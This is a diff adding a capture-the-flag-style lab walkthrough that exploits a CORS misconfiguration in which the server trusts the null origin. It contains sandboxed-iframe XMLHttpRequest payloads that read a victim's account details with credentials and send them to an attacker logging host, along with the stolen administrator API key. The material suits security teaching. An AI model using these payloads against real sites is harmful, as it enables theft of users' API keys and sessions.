@@ -1,0 +1,125 @@
+# CORS vulnerability with trusted null origin
+
+## Lab Description :
+
+![Cap dashboard screenshot](cors-level-2-1.png)
+
+## Overview :
+Errors parsing Origin headers -
+For example, suppose an application grants access to all domains ending in
+
+`` normal-website.com ``
+
+Then an attacker might be able to gain access by registering the domain:
+
+`` hackersnormal-website.com ``
+Alternatively, suppose an application grants access to all domains beginning with
+
+`` normal-website.com ``
+ 
+An attacker might be able to gain access using the domain:
+
+`` normal-website.com.evil-user.net``
+
+Whitelisted null origin value -
+The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:
+
+Some applications might whitelist the null origin to support local development of the application. For example, suppose an application receives the following cross-origin request:
+
+```html
+GET /sensitive-victim-data
+Host: vulnerable-website.com
+Origin: null
+```
+
+And the server responds with:
+
+```html
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+```
+
+In this situation, an attacker can use various tricks to generate a cross-origin request containing the value null in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed iframe cross-origin request of the form:
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location='malicious-website.com/log?key='+this.responseText;
+};
+</script>"></iframe>
+```
+
+## Solution :
+Login to the website using credentials - `` wiener:peter. ``
+
+Once logged in, we can see the API key of wiener.
+
+![Cap dashboard screenshot](cors-level-2-2.png)
+
+Analysis -
+The GET request to ``/accountDetails`` contains ``Access-Control-Allow-Credentials`` in the response.
+
+![Cap dashboard screenshot](cors-level-2-3.png)
+
+Note that there is no Access-Control-Allow-Origin header in response because the Origin header is not specified in the request.
+
+If we give ``Origin: evil.com`` in request, we can see that in the response it does not contain any ``Access-Control-Allow-Origin: evil.com``header. Which means evil.com is not in the whitelisted domains.
+
+What happens if we try to give Origin: null in request?
+
+![Cap dashboard screenshot](cors-level-2-4.png)
+
+This time we have the Access-Control-Allow-Origin: null header in the response. This means null is in the whitelisted domains.
+
+Some applications might whitelist the null origin to support local development of the application.
+
+So by this we can bypass CORS & retreive the API key of administrator.
+
+Embedding script in iframe -
+Scripts that originate from an iframe usually contains Origin: null.
+
+So we need to embed our exploit script inside an iframe.
+
+Script -
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','0a5000b3043375d0842d91cd0199006b.exploit-server.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='exploit-0a5000b3043375d0842d91cd0199006b.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+```
+
+After clicking Deliver exploit to victimopen the Access.log. There we can find the API key of the administrator.
+
+```text
+{
+  "username": "administrator",
+  "email": "",
+  "apikey": "wP4InQrrPWqaqAGPQM8bZVbTH1p0JeVe",
+  "sessions": [
+    "3V9Od14F6X5ATsCIYK2N6bGJq3VDEEFg"
+  ]
+}
+```
+
+![Cap dashboard screenshot](cors-level-2-5.png)
+
+Submit the API key of administrator to solve the lab.
+
+![Cap dashboard screenshot](cors-level-2-6.png)
+
+#### Visit The Next Page For The Next Level :)
+
